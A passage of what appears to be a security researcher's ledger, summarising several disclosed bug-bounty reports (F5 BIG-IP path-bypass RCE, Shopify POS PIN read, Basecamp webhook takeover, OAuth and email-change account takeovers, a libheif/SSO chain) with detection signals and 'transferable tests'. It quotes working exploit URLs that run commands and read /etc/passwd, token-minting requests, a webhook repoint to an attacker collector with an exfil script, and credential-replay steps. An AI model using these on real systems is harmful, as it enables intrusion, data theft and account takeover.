  3. THE ENTRY POINTS (public PoC shapes, verbatim): `curl -k 'https://<host>:<port>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'` (tmsh command execution); `GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd` (also `/config/bigip.conf`, `/config/bigip.license`); `GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp` (file write); `GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/`; `GET /tmui/login.jsp/..;/hsqldb`.
  4. RCE + IMPACT: `tmshCmd.jsp?command=...` runs arbitrary tmsh; the Metasploit module `exploit/linux/http/f5_bigip_tmui_rce` ("Directory Traversal and File Upload RCE") chains it to a shell. F5's impact statement, verbatim: "execute arbitrary system commands, create or delete files, disable services, and/or execute arbitrary Java code... This vulnerability may result in complete system compromise." Affected 11.6.1–15.1.0.3 (fixed 15.1.0.4 / 15.0.1.4 / 14.1.2.6 / 13.1.3.4 / 12.1.5.2 / 11.6.5.2).
DETECTION SIGNAL: an edge appliance (ADC/load balancer/VPN/firewall) with a vendor web console on the perimeter or an obscure subdomain; a URL whose `..;` (or `%3b`) segment makes the proxy and the backend disagree about the resolved path — the tell is a 200 where the un-bypassed path 404s or redirects to login; F5's own IoC log line, verbatim: `"/[REDACTED]/..;/[REDACTED]" 200 252` — "A 200 indicates that the request was successful, which is a strong indicator of a successful exploit" — and F5's mitigation regex names the pattern: `<LocationMatch ";">` / `.*\..;.*`.
CHAIN: unauthenticated attacker, network reach to the TMUI (preconditions: none — no auth, no interaction) -> `..;` normalization mismatch bypasses front-end routing/auth -> hidden `tmshCmd.jsp` executes the attacker's `command=` (primitive: an undisclosed admin JSP is a command-execution surface) -> arbitrary system commands / file read / file write / Java code -> complete BIG-IP compromise (config + credential + certificate theft, traffic interception — the device proxies the target's traffic) -> downstream network/tenant compromise (impact: pre-auth RCE, CVSS 10.0).
TRANSFERABLE TEST: on every edge appliance / vendor admin console in scope — (1) probe the known admin paths THROUGH a `..;/` normalization bypass: `/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin` and `fileRead.jsp?fileName=/etc/passwd`; (2) the general form: take a PUBLIC path as prefix (`/login.jsp`, `/admin/index.jsp`) and append `/..;/` + the hidden path — when the front end routes on the prefix and the back end resolves the suffix, hidden/undocumented admin endpoints become unauthenticated (also try `%3b`, `%2f`, `;` variants — the playbook's path-differential checklist); (3) vendor "undisclosed" pages are hidden only FROM THE UI — enumerate them from public PoCs/vendor IoCs (F5's `LocationMatch` regex is a map); (4) on any hit, follow the vendor's own escalation: command page -> shell, fileRead -> config/credential theft. Rule: **an edge appliance's hidden admin pages are hidden only from the UI — a `..;/` path-parameter normalization mismatch between the front-end proxy and the backend servlet container reaches them unauthenticated, and those pages are built to execute commands.**
DEDUPE/DELTA: 0 hits across all three write targets for `tmshCmd`, `fileRead.jsp`, `login.jsp/..;`, `K52145254`, `CVE-2020-5902`, `TMUI`. Related-but-distinct REVIEWED and NOT re-recorded: the playbook's PATH-DIFFERENTIAL checklist (ledger ~1406/1931: "test `;`, `%3b`, `..;/`, `%2f` path variants") names `..;/` as a probe variant but records NO mechanism, entry point or chain — this entry is the method behind that checklist item; the edge-appliance chain at ledger ~2263 (Pulse-style SSL-VPN `/dana-*/…/../…` traversal-oracle FILE READ -> session/2FA theft -> RCE) is a traversal file read on a different family, not a normalization mismatch to hidden JSPs; the Apache 2.4.49 normalization entry (ledger ~4362) is server-side traversal to files, not an auth bypass to admin command pages. NEW: `..;/` front-end/backend normalization mismatch -> hidden vendor admin JSPs -> pre-auth command execution -> §17.492. FRESHNESS: CVE-2020-5902 is 2020 and the report was disclosed 2022-03 — far outside the preferred window (read because assigned); the F5 line is long patched, and the METHOD class survives on every proxy/backend pair that disagrees about `..;`/`;`.

SOURCE: https://hackerone.com/reports/1242680  2026-11-11
ROUTE: full reporter body read live this pass on the `.json` route (`curl` -> HTTP 200, `visibility: full`, `vulnerability_information` 1,276 B; `web_extract` rendered the same body). Metadata: HackerOne (own platform), "Report Duplicate Detector can match deleted and draft reports, may disclose title and vulnerability information", weakness Information Disclosure, severity low (3.4), $0 ("ineligible for a reward because it was found by a HackerOne employee"), reporter `jobert` (HackerOne staff), created 2021-06-24, disclosed 2021-06-24, Closed resolved.
STATUS: UNVERIFIED (not reproduced — no HackerOne test program was used this pass; the flow and thresholds are quoted verbatim from the report).
CLASS: sensitive-information disclosure / broken access control — a SIMILARITY-MATCHING feature's match corpus includes records in STATES the requester cannot access (draft / editing / deleted), and its result list discloses those records' titles; the match threshold turns crafted probes into a content-enumeration oracle.
CORE METHOD (the reporter's own steps, quoted):
  1. THE FEATURE, verbatim: "When a Report is submitted on HackerOne.com, a feature called the Report Duplicate Detector helps program members and triagers find potential duplicates of the submitted report. This feature will match against all reports that were submitted to the program."
  2. THE GAP, verbatim: "When the feature was introduced, all reports associated with a member's program were accessible. Over time though, two states were added, editing and deleted, that are not accessible by program members. However, the Report Duplicate Detector can be used to access information from reports in those states under certain circumstances."
  3. PoC, verbatim: "as a hacker, create a draft report (do not submit) / as a program member of the program, submit a report with the same contents as the draft report / wait for the Report Duplicate Detector results to show up on the report / observe that the Report Duplicate Detector will disclose the title of the hacker's draft report"
  4. THE ENUMERATION, verbatim: "Reports are required to have at least 50% overlap based on a number of features for them to be marked as potential duplicates. The Report Duplicate Detector will return up to 10 reports, sorted by similarity descending. Depending on how unique the contents of the draft report are, they can be determined by an enumeration attack."
DETECTION SIGNAL: any matching/dedup/similarity feature ("possible duplicates", "similar items", "you may have already reported this") whose corpus spans records the caller cannot read — draft/editing/deleted/other-tenant states; the tell is a result list that NAMES matched records (title, id, snippet) whose ACL says the caller may not see them, plus a match threshold (here ≥50% overlap) that turns crafted probes into an oracle.
CHAIN: a record exists in an inaccessible state — draft, editing, deleted (primitive: the object is ACL-hidden from the viewer) -> the duplicate detector matches against ALL records regardless of state (primitive: the matcher runs server-side over data the requester's ACL excludes) -> the result list returns the hidden record's TITLE when a probe overlaps ≥50% (primitive: match-result metadata is a READ of hidden objects) -> craft unique-content probes and use the top-10-sorted-by-similarity ordering to enumerate the hidden report's content (escalation: title -> vulnerability information) -> cross-user disclosure of other researchers' unpublished/deleted findings (impact: sensitive information disclosure; on a bounty platform this is stolen-findings / steal-the-bounty material).
TRANSFERABLE TEST: on any platform with a duplicate/similarity/"did you mean" feature — (1) create a record in a hidden state (draft/unpublished/deleted) with unique content; (2) from ANOTHER account submit a probe whose content overlaps the hidden record by ≥50%; (3) read the match results: if the hidden record's title/id/snippet comes back, the corpus ignores ACL/state; (4) then enumerate: vary probe content and use the similarity ordering (top-10, descending) to recover the hidden record's content — a binary search over content. Rule: **a matcher's corpus is a back-door read — if it matches against records your ACL excludes (drafts, deleted, other tenants) and names them in the results, crafted overlap probes enumerate everything the matcher can see.**
DEDUPE/DELTA: 0 hits across all three write targets for `1242680`, `Duplicate Detector`, `jobert` (as this report), `50% overlap`. Related-but-distinct REVIEWED and NOT re-recorded: §17.293 (#247628, also HackerOne's duplicate bot) is the SIBLING oracle — there the matcher returns a similarity PERCENTAGE and the attack WALKS THE SCORE GRADIENT per character to recover a REDACTED VALUE; here the matcher returns the matched record's TITLE directly and the bug is an ACL gap in the CORPUS (draft/deleted states readable) with a ≥50%-overlap enumeration attack. §17.293's transferable test (walk the score) does not find this bug, and this test (probe hidden states) does not recover redacted values — two different mechanisms on one feature family. #2552205 (draft-report exposure via implicit SUBSCRIPTION/notification) and #1664920 (drafts in the CSV EXPORT) leak drafts through different mechanisms (subscription, export breadth) — neither is a matching oracle. NEW: the similarity-match corpus includes ACL-hidden states and the result list reads them -> §17.493. FRESHNESS: created/disclosed 2021-06-24 — outside the preferred window (read because assigned).

SOURCE: https://hackerone.com/reports/1091303  2026-11-11
ROUTE: full reporter body read live this pass on the `.json` route (`curl` -> HTTP 200, `visibility: full`, `vulnerability_information` 5,651 B with the complete request/response pairs). Metadata: Shopify (h1-2102 CTF — "[Yaworski's Broskis]"), "Low privilege user can read POS PINs via graphql and elevate his privilege", weakness Information Disclosure, severity Medium (5.4), $5,300, reporter `ramsexy`, created 2021-01-31, disclosed 2021-04-08, Closed resolved. Shopify's own CURRENT-POLICY note on the page, verbatim: "The situation with PIN access has changed since the time of this report. PINs no longer require Full Admin permissions in order to be read in Shopify Admin... For this reason, we no longer accept reports about being able to read or bruteforce PINs as another staff member on the same shop."
STATUS: UNVERIFIED (not reproduced — no Shopify shop or POS terminal was stood up this pass; the request shapes below are quoted verbatim from the report).
CLASS: GraphQL FIELD-LEVEL AUTHORIZATION GAP (IDOR/BOLA family) -> sensitive secret disclosure -> VERTICAL PRIVILEGE ESCALATION BY SECRET REPLAY — a low-privilege staff member's POS-app token can query the `pin` field of EVERY StaffMember (including the shop owner) and replays the Manager PIN at the POS terminal.
CORE METHOD (the reporter's own steps, quoted):
  1. THE STATE: create a staff user; on its POS staff page (`/admin/apps/pos/staff/<id>`) check "Give Point of Sale access" and select the "Associate" role; then remove ALL permissions in Shopify Plus — POS access survives (the UI itself warns about it, verbatim "Please notice the following message about POS").
  2. TOKEN MINT via the APP'S INTERNAL AUTH ENDPOINT: `POST /admin/api/xauth` with body `{"api_key":"<found in the page /admin/apps/pos>","login":"<low-priv email>","password":"..."}` (headers: `Accept: application/json`, `Content-Type: application/json`, `User-Agent: okhttp/4.0.0`) -> `{"access_token":"...", "scope":"read_analytics,write_checkouts,...,write_users,...", "associated_user_scope":"write_checkouts,...,read_users,read_retail_roles,...", "associated_user":{...,"account_owner":false,...}}` — the top-level `scope` is the APP's scope; the user's real rights are `associated_user_scope`. The `api_key` is harvestable from `/admin/apps/pos`.
  3. THE READ via the APP'S OWN GRAPHQL QUERY: `POST /admin/api/unversioned/graphql` with `X-Shopify-Access-Token: <access_token>` and the POS app's StaffList query (fragment `RemoteStaffMember` requests `pin`, `isShopOwner`, `permissions`, `privateData`, `retailData{retailRole{...}}`; `variables: {"first":100,"query":"updated_at:>1970-01-01T00:00:00Z"}`) -> response includes, verbatim: `"pin": "3333", "id": "gid://shopify/StaffMember/61340352568", "isShopOwner": true` — every staff member's PIN, including the shop owner's.
  4. THE ESCALATION, verbatim: "the low privilege user can use the Manager PIN while using the POS device, which allow him to perform various actions he should not be able to do" — a READ becomes vertical privilege escalation at the terminal.
DETECTION SIGNAL: mobile/POS/first-party client apps carrying their OWN internal auth endpoint (`/admin/api/xauth`-style; `api_key`/`client_id` harvestable from an admin page or the bundle) and their own unversioned/private GraphQL surface; a token whose top-level `scope` is wider than `associated_user_scope`/role claims (the app's scope, not the user's); GraphQL responses containing SECRETS the UI never shows to that role (`pin`, `passcode`, `role`, `privateData`). The tell: the app's own persisted queries (from the mobile bundle) request fields the web UI hides.
CHAIN: low-privilege staff account with POS "Associate" access (precondition: any shop staff account + POS role; all other permissions stripped) -> `POST /admin/api/xauth` mints a token with the APP's scope from the low-priv creds + harvested `api_key` (primitive: the app-internal auth endpoint trusts the app's own key) -> the POS app's `StaffList` GraphQL query returns `pin` for ALL staff incl. the owner's Manager PIN (primitive: field-level authz gap — `pin` is not gated to admin viewers) -> replay the Manager PIN at the POS terminal (escalation: a READ secret is a REPLAYABLE credential) -> perform manager-only POS actions = vertical privilege escalation (impact: Medium 5.4 here ONLY because the final step needs physical POS access; the same field-level read alone is cross-user secret theft, and on other platforms the replayed secret is an account/role takeover).
TRANSFERABLE TEST: on any platform with a mobile/POS/first-party client app — (1) find the app's internal auth endpoint and its client key (`api_key`/`client_id` in the app's admin page or bundle) and mint a token AS THE LOWEST-PRIVILEGE USER (`POST /admin/api/xauth` shape); (2) diff `scope` vs `associated_user_scope`/role claims in the response — the wider one belongs to the app, not the user; (3) replay the APP's own persisted GraphQL/REST queries (lifted from the mobile bundle) requesting every sensitive field (`pin`, `passcode`, `role`, secrets) on OTHER users' objects; (4) any secret that comes back is replayable — replay it wherever it is accepted (terminal, device, manager prompt) and record the privilege delta. Rule: **a client app's internal auth endpoint hands low-priv users an app-scoped token, and the app's own queries read the secrets the UI hides — a PIN/passcode read through a GraphQL field-level gap is not info disclosure, it is a stolen manager credential: replay it where it is accepted.**
DEDUPE/DELTA: 0 hits across all three write targets for `1091303`, `xauth`, `StaffMember`, `POS PIN`, `associated_user_scope`, `unversioned/graphql` (in this shape). Related-but-distinct REVIEWED and NOT re-recorded: §10.2 (#489146 — "GraphQL field-level authorization missing"; its three-layer lesson "can I reach the field / this object / this object as this viewer" and its scalar-enumeration test OWN the class root); the GraphQL field-value-oracle families (batch 45/46 entries) are read-oracle variants, not secret-replay escalation; the PIN entry at ledger ~6625 is the OPPOSITE direction (a UI-only re-auth gate on a PIN/password settings screen exposing the caller's OWN secret). SOURCE: https://hackerone.com/reports/3979217  2026-11-11
ROUTE: reporter body read IN FULL this pass from the public mirror `ajaysenr/HackerOne-Disclosed-Reports` (raw.githubusercontent.com `/reports/3979217.md`) — the complete PoC with every request/response shape (attacker/victim account ids, the shared webhook-id counter, the 403-vs-200 verb differential, cross-host replays, the exfil payload, the negative control) + the metadata table cross-checked on the HackerOne Hacktivity listing. Metadata: Basecamp, "Cross-account webhook takeover: PUT and DELETE on /<account>/webhooks/<id>.json reach another account's webhook", weakness Improper Authentication - Generic, severity High (CVSS 8.3), reporter `deivizzzz` (+`sergioatenor`), asset app.basecamp.com / 3.basecampapi.com, reported 2026-08-29, disclosed 2026-10-30, Resolved.
STATUS: UNVERIFIED (not reproduced — no Basecamp account was touched this pass; every request below is quoted from the report).
CLASS: cross-account BAC/IDOR on a nested WRITE API — the write verbs (PUT/DELETE) authorize on the WRONG relationship (project visibility instead of account membership) while the READ verb denies, and webhook ids come from ONE global counter shared by every account, so any user walks the id space and repoints other customers' webhooks (CWE-863/CWE-639).
CORE METHOD (the reporter's own steps, quoted):
  1. TWO IDENTITIES, verbatim: "attacker identity 28665850 accounts [6267386]" / "victim identity 28662102 accounts [6266520]" — "Two accounts I own, no shared membership."
  2. THE COUNTER, verbatim: `POST /6266520/buckets/48629889/webhooks.json -> 201 {"id":1996542,...}` and `POST /6267386/buckets/48681891/webhooks.json -> 201 {"id":1996543,...}` — "victim webhook id 1996542, attacker webhook id 1996543 (consecutive, different accounts)".
  3. THE PRECONDITION SET BY THE VICTIM'S OWN CONTROL: `POST /6266520/projects/48629889/admissions project[admissions]=employee -> 302` -> `all_access = True`.
  4. THE VERB ASYMMETRY, verbatim: `GET /6267386/webhooks/1996542.json -> 403 {"message":"You must first seek admission",...}` ("read handler denies") vs `PUT /6267386/webhooks/1996542.json -> 200 {"id":1996542,...}` ("write handler ALLOWS") — the attacker's OWN account id in the PATH, the VICTIM's webhook id; identical on `app.basecamp.com` and `3.basecamp.com`; a nonexistent id -> 404 (existence oracle).
  5. THE ATTACKER CANNOT TAKE THE OFFERED ADMISSION (`POST /6266520/.../admissions.json -> 404`, victim-account form -> 401) yet the PUT still lands.
  6. THE REPOINT + ERASE: the PUT sets `payload_url` to the attacker's server (victim's own `GET /6266520/webhooks/1996542.json` now shows `payload_url":"https://example.com/att...`); `DELETE /6267386/webhooks/1996542.json -> 204` and the victim's GET is 404.
  7. THE NEGATIVE CONTROL, verbatim: `project[admissions]=invite` -> `PUT -> 403` — the write is gated on project visibility ("All-access"), exactly the wrong relationship.
  8. THE EXFIL, verbatim: `python3 exfil.py https://<collector>/exfil` — the hijacked webhook delivers `User-Agent: Basecamp3 Webhook`, `{"kind":"message_created","title":"BOARD MEETING NOTES - CONFIDENTIAL",...,"content":"\u003cdiv\u003eacquisition price is 4.2M, do not share\u003c/div\u003e"}` — "receiving each message, comment, to-do and document posted there."
DETECTION SIGNAL: a nested resource whose GET and PUT/PATCH/DELETE hit DIFFERENT authorization code paths (403 read + 2xx write on the same foreign object id); write authorization keyed on a relationship weaker than membership (visibility / shared project / follower / "all-access"); object ids incrementing from ONE counter across tenants (create objects in two tenants back-to-back and compare); webhook/callback/subscription objects (`payload_url`, `callback_url`) as ready-made exfil channels.
CHAIN: any registered user (preconditions: just an account; the victim project is All-access — a routine Basecamp setting) -> walk the small global webhook-id space (primitive: shared counter = cross-tenant id oracle) -> `PUT` the victim's webhook with the attacker's account id in the path (primitive: write handler authorizes on visibility, not membership; the 403 read proves the object is not the caller's) -> the customer's webhook streams every message/comment/to-do/document to the attacker's collector (impact: cross-tenant confidential-data interception; team High 8.3) -> `DELETE` erases the trace.
TRANSFERABLE TEST: on any nested multi-tenant API — (1) VERB DIFFERENTIAL: against a foreign object id send GET, PUT/PATCH and DELETE separately; a 403 read with a 2xx write IS the bug; (2) WRONG-RELATIONSHIP: list every condition granting write (visibility, shared team, follower, admissions) and ask whether any is weaker than the membership the object requires; (3) COUNTER: create one object in each of two tenants back-to-back — consecutive ids mean one global space, walk it; (4) WEBHOOK REPPOINT: swap `payload_url`/`callback_url` to your collector and record what the object emits — the emitted stream is the impact proof. Rule: **a read 403 is not evidence the object is protected — replay every WRITE verb against foreign ids, and treat a globally shared id counter as a cross-tenant enumeration oracle.**
DEDUPE/DELTA: 0 hits across all three write targets for `3979217`, `deivizzzz`, `sergioatenor`, `webhooks.json`, `admissions`, `1996542`. Related-but-distinct REVIEWED and NOT re-recorded: the method-override / "HTTP method variations" material (V-06 family; the blind-numeric-idor row "HTTP method switching ... BOLA/BFLA") is about OVERRIDE HEADERS and verb dispatch on FUNCTION-level authz — here the same OBJECT's read and write handlers hold different authz logic; §17.427 (#1695454 Pressable) is the body-field object-id carrier + validation-error disclosure, not a verb asymmetry; the shared-counter link-id material (~ledger 10687, Kaspersky interstitials) is client-side override links in a different domain; §17.459 (Slack `event-subscriptions`) is a loopback-alias banner read. NEW: verb-asymmetric authorization on a nested resource + authorization keyed on visibility instead of membership + global cross-account id counter + webhook-repoint data interception -> §17.495.

SOURCE: https://hackerone.com/reports/3999856  2026-11-11
ROUTE: the reporter body is redacted (`vulnerability_information` absent — the public mirror prints "*No vulnerability information available.*"); the METHOD is carried by the program's OWN official summary, read verbatim this pass on the `ajaysenr/HackerOne-Disclosed-Reports` mirror + the Hacktivity listing. Metadata: Basecamp, "A third-party Basecamp OAuth token mints a full launchpad web session through GET /my/login_option", weakness Improper Access Control - Generic, severity High (CVSS 8.0), reporter `deivizzzz`, asset launchpad.37signals.com, reported 2026-09-05, disclosed 2026-10-30, Resolved.
STATUS: UNVERIFIED (not reproduced — no 37signals account or OAuth integration was touched; every statement below is quoted from the program summary).
CLASS: OAuth confused-deputy TOKEN->SESSION CONVERSION — a first-party SSO/session-bridge handoff endpoint accepts ANY third-party OAuth access token (including one scoped to a single product's data) and mints a FULL first-party web session for the account owner; the session outlives token revocation (CWE-287/CWE-269).
CORE METHOD (the program summary, verbatim):
  1. THE ENDPOINT: "A Basecamp API endpoint that hands a signed-in person off to their 37signals ID web session accepted any third-party OAuth token, including one an integration had been granted only for Basecamp data." — `GET /my/login_option` (asset launchpad.37signals.com).
  2. THE ESCALATION: "An integration the victim had authorized could obtain a full 37signals ID web session, change their account settings, and keep that session after its access was revoked." — a product-scoped API token becomes an account-wide interactive session.
  3. THE FIX (a map of the intended trust boundary): "The handoff now only honors the session bridge our own apps use, so third-party OAuth tokens can no longer mint a 37signals ID session through it."
DETECTION SIGNAL: an SSO/session-bridge handoff ("continue to your account", `login_option`, launchpad-style finalize) that exchanges a bearer/OAuth token for a web session cookie; tokens whose SCOPE is product-scoped while the minted session is account-wide; revoking the token/integration NOT invalidating the minted session.
CHAIN: victim authorizes a third-party integration (routine OAuth consent) -> the integration (or its operator) calls `GET /my/login_option` with its OAuth token (primitive: handoff accepts third-party tokens — confused deputy) -> a full 37signals ID web session is minted (escalation: API token -> interactive first-party session; change account settings = ATO) -> the session persists after the integration's access is revoked (impact: ATO with persistence past remediation; team High 8.0).
TRANSFERABLE TEST: on any product with SSO handoffs — (1) enumerate every session-MINTING endpoint (`/login_option`, `/session`, `/continue`, `/sso/finalize`, "open in web"); (2) call it with a THIRD-PARTY/low-scope OAuth access token instead of the app's own bridge credential; (3) if a web session cookie returns, diff its powers against the token's documented scope (settings write / account mutation = escalation to ATO); (4) revoke the token/integration and reuse the minted session — survival past revocation is the second defect. Rule: **a session-bridge handoff must accept only the app's own bridge credential — any endpoint that converts a third-party token into a first-party web session is an OAuth confused deputy, and the session must die with the token.**
DEDUPE/DELTA: 0 hits across all three write targets for `3999856`, `login_option`, `deivizzzz` (as a source), `session bridge`. Related-but-distinct REVIEWED and NOT re-recorded: §17.126 (#294911 Mapbox — a VALID session minted on a FAILED OAuth exchange; different trigger), the scoped-token scope-escape entry (~ledger 10950 — the TOKEN surviving revocation/fallback, not converting into a higher-privilege session), #1547684 (unlink does not revoke minted sessions) and §10069 (accept-token replay after state revocation) — those own the REVOCATION-LIFECYCLE leg; the ledger's OAuth flow-bypass family (redirect_uri/consent/state) is flow-level. NEW: third-party OAuth token -> first-party web session via the session-bridge handoff, with revocation persistence -> §17.496.

SOURCE: https://hackerone.com/reports/3324823  2026-11-11
ROUTE: reporter body read IN FULL this pass from the public mirror `ajaysenr/HackerOne-Disclosed-Reports` (`/reports/3324823.md`) — the complete Steps to Reproduce and impact statement (the target host and PoC URLs are redacted in the report itself). Metadata: U.S. Dept of Defense, "Account Takeover via Unverified Email Change and Improper Session Handling", weakness Violation of Secure Design Principles, severity High (CVSS 8.8), reporter `0xoroot`, reported 2025-09-03, disclosed 2026-01-12, Resolved.
STATUS: UNVERIFIED (not reproduced — no DoD asset was touched; every step below is quoted from the report).
CLASS: account-identity RE-BINDING ATO — an email CHANGE to an unverified address is accepted effective immediately; when the address's real owner LATER registers, the attacker's EXISTING session (and every future login) resolves to the victim's NEW account because identity is keyed on the email and no session invalidation or verification runs on the key change (CWE-287/CWE-384 family).
CORE METHOD (the reporter's own steps, quoted):
  1. "Register a new account using Google authentication." (federated signup — the email provenance is trusted from here on)
  2. "Change the account email to the victim's email address (note: the victim's email is not yet registered)." — accepted "without proper verification".
  3. "The victim registers on the website using that same email."
  4. "Observe that the attacker's existing session is not expired, and the attacker now has access to the victim's account data, even though the email is associated with the victim."
  5. "Log out from the attacker's account. Log in again with the attacker's credentials. You will notice that you are automatically logged into the victim's account instead of your own, confirming account takeover."
DETECTION SIGNAL: an email change accepted with NO verification step and effective immediately; account records keyed by email where a later registration RE-BINDS an existing identity; sessions NOT invalidated when the account's identity key changes; re-login landing in a different account than the credential's own record (test by logging in twice after the victim registers).
CHAIN: attacker changes their account email to the victim's unregistered address (primitive: unverified identity-key change) -> the victim later registers with that address (routine) -> the attacker's live session re-binds to the victim's account without expiry (primitive: session identity resolved through the mutable key) -> full read/write of the victim's account data -> logout + re-login with the ATTACKER's own credentials still lands in the victim's account (impact: persistent ATO; team High 8.8).
TRANSFERABLE TEST: the two-account re-bind test — (1) as A, change your account email to B's UNREGISTERED address and note whether any verification is demanded or the change is deferred; (2) let B register with that address; (3) check A's still-open session: which account does it serve now? (4) log A out and back in with A's OWN credentials — landing in B's account is the ATO; (5) check for session invalidation/notification on identity change (its absence is the second defect); (6) also test the mirror order (victim changes to your address first / you register first) — whichever side claims the key last wins. Rule: **an identity key change must re-verify AND invalidate sessions — if changing your email silently re-binds live sessions when the real owner shows up, the registration flow is an account-pre-hijack.**
DEDUPE/DELTA: 0 hits across all three write targets for `3324823`, `0xoroot`, `automatically logged into the victim`. Related-but-distinct REVIEWED and NOT re-recorded: §11.6's one-line **pre-hijacking** bullet (attacker REGISTERS the victim's email first via a classic form, then the victim's OAuth "link" leaves the attacker a recovery path — the attacker pre-creates the account; here the attacker RE-KEYS an EXISTING account and the SESSION RE-BINDS into the victim's later-created account, and re-login persists), §12.1 (XSS -> email change -> ATO — needs XSS), #229619 (confirmation token leaked in a resend link), #1250037 (IDOR email-change), §17.285/#1018489 and the Shopify external-login-for-unverified-emails entry (ACCOUNT LINKING bugs). NEW: unverified identity-key CHANGE + session re-binding into the victim's later registration -> §17.497.

SOURCE: https://www.hacktron.ai/blog/hacking-openai  2026-11-11
ROUTE: the original Hacktron AI research writeup ("Hacking OpenAI", Harsh Jaiswal / Mohan Pedhapati / Rahul Maini; events 2026-07-23..25, published mid-Sept 2026) read IN FULL this pass via `web_extract`; a secondary analysis (dev.to) and the Bugcrowd/HackerOne disclosure records were cross-checked via web search. Payment/ack facts as written: OpenAI (Bugcrowd) paid $6,500 for the OpenAI-side finding; Discourse (HackerOne, GHSA-vhm9-85gw-x335) patched in two days and added image-processing sandboxing.
STATUS: UNVERIFIED (not reproduced — no upload pipeline or SSO was touched; the exact SSO request shapes are NOT public: "OpenAI asked us not to publish the original, so this is a reconstruction" — only the chain and the discovery method are recorded; nothing below is invented).
CLASS: (a) RCE via the FORMAT-EXCEPTION FALLBACK DECODER in an image-upload pipeline — a heap overflow (CWE-122) in the native `libheif`/`libde265` decoder, reached because the primary validator does not support HEIF and the file is handed to a secondary converter (ImageMagick `magick`) that exposes the parser directly to attacker files; (b) SSO IDENTITY-ESTATE escalation — compromise of ANY service using "Sign in with OpenAI" (`auth.openai.com`) yields zero-interaction ChatGPT/Codex account takeover of every user who signed into that service.
CORE METHOD (sourced steps, verbatim quotes):
  1. THE DISCOVERY QUESTION, verbatim: "where does this application hand files it cannot understand to someone else's parser?" — "Discourse normally used FastImage for image checks, but because FastImage did not support HEIF, it passed those files to ImageMagick's `magick` command for conversion. That exposed the underlying `libheif` parser directly to attacker-controlled files."
  2. THE DEPENDENCY FIND: the installed `libheif` in the Discourse Docker image lacked backported security fixes — "the commit was not documented as a security fix and received no CVE" (Debian 12 shipped 1.19.7, Debian 13 still shipped 1.19.8 vulnerable at the time) -> "heap buffer overflow leading to OOB R/W primitives during HEIC decoding".
  3. THE TRIGGER: upload a crafted `.heic`/`.heif` to the forum's image/avatar pipeline -> code execution on the Discourse host (advisory GHSA-vhm9-85gw-x335; Discourse added ImageMagick sandboxing as defense in depth).
  4. THE SSO LEG, verbatim: "OpenAI uses Discourse for their forum and allows 'Sign in with OpenAI' through `auth.openai.com`"; "After we had confirmed our hypothesis of no interaction account takeover of ChatGPT/Codex accounts from active members of the forum"; "The escalation bug is not specific to Discourse. It is an OpenAI SSO issue that turned the forum compromise into access to ChatGPT and Codex. If any first-party or third-party OpenAI service using the OpenAI SSO was compromised, it would lead to the same access."
  5. THE IMPACT PROOF: an employee's GitHub-connected Codex opened PR #1186742 in the internal monorepo `openai/openai` (harmless README change, then stopped); "Since people can connect various services to Codex and ChatGPT, the scope of what we could theoretically access was huge, including GitHub, Slack and emails."
DETECTION SIGNAL: an upload pipeline with a format-EXCEPTION branch (primary validator lacks the format -> secondary converter/parser invoked — the detour lives in error-path code); `.heic`/`.heif`/`.avif` accepted anywhere (avatars, attachments, imports); distro-packaged native decoders whose security fixes are UNMARKED upstream (a version check cannot clear this — diff upstream git log against the packaged version); any "Sign in with <provider>" connected first/third-party property where the identity artifact minted at login (IdP-domain session cookie/token) is valid at the IdP's CORE product and sibling RPs.
CHAIN: crafted HEIF upload -> format-exception fallback hands it to ImageMagick -> `libheif` heap overflow -> RCE on the forum host (P1) -> harvest the SSO identity artifacts of active users who signed in via "Sign in with OpenAI" (primitive: the identity artifact is estate-wide, not RP-scoped) -> zero-interaction takeover of ChatGPT/Codex accounts INCLUDING employees (escalation: full ATO) -> connected integrations (GitHub via Codex, Slack, email) -> an internal-monorepo PR proves internal-repo access (impact; testing stopped there). Two bugs, one chain, two vendor programs.
TRANSFERABLE TEST: (1) on any media pipeline, submit each exotic format (heic/heif/avif/tiff/psd/raw) and trace WHICH validator and WHICH decoder actually handles it — the unsupported-format fallback is the unreviewed parser exposure (grep converter command lines and the primary check's supported-format list); (2) fingerprint the native decoder versions (libheif/libde265) and diff against upstream commits — unmarked fixes bypass CVE/version heuristics; (3) separately map every "Sign in with <provider>" property: what identity artifact does the RP hold, and does RP-side compromise (XSS/RCE/support-tool leak) yield credentials valid at the IdP core product and other RPs? That mapping is the severity multiplier for ANY compromise of a connected property. Rule: **audit the branch where the app admits it cannot parse a format and hands the file to someone else — that fallback is a parser nobody reviewed, and if the property shares an SSO estate, the RCE is a first-class account takeover of every user who ever signed in.**
DEDUPE/DELTA: 0 hits across all three write targets for `Hacktron`, `libheif`, `HEIF`, `1186742`, `auth.openai`, `community.openai`. Related-but-distinct REVIEWED and NOT re-recorded: the ImageMagick/converter family (~ledger 3540 detection signal, #365271 ghostscript-delegate entries, the Rails ActiveStorage `convert` entry ~8116) covers the CONVERTER's own delegate/argument surfaces — here the bug is a heap overflow in a NATIVE DECODER reached through the format-exception FALLBACK, and the transferable method is fallback-tracing + unmarked-fix auditing; §17.125 (document-external-link SSRF through conversion) is egress, not memory corruption; the ledger's OAuth/SSO entries (redirect_uri/consent/state flow bypasses, §17.126 failed-exchange session) are flow-level — here there is NO flow bypass: the defect is the estate-wide sharing of the identity artifact, and the mechanics are unpublished (recorded as such).
